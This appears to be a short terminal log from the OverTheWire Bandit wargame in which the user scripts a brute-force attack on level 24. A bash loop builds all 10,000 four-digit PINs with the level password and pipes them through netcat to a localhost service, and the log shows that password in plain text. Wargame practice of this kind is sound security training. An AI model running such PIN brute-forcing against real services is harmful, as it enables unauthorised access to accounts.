mktemp -d 
/tmp/tmp.x44ep3TQyE
bandit24@bandit:~$ cd tmp/tmp.x44ep3TQyE
-bash: cd: tmp/tmp.x44ep3TQyE: No such file or directory
bandit24@bandit:~$ cd tmp/tmp.x44ep3TQyE
-bash: cd: tmp/tmp.x44ep3TQyE: No such file or directory
bandit24@bandit:~$ cd /tmp/tmp.x44ep3TQyE
bandit24@bandit:/tmp/tmp.x44ep3TQyE$ nano solve.sh
==bashshellcode==
#!/bin/bash

for i in {0000..9999}
do
        echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt
==
bandit24@bandit:/tmp/tmp.x44ep3TQyE$ chmod +x solve.sh
bandit24@bandit:/tmp/tmp.x44ep3TQyE$ ./solve.sh
cat result.txt | grep bandit25


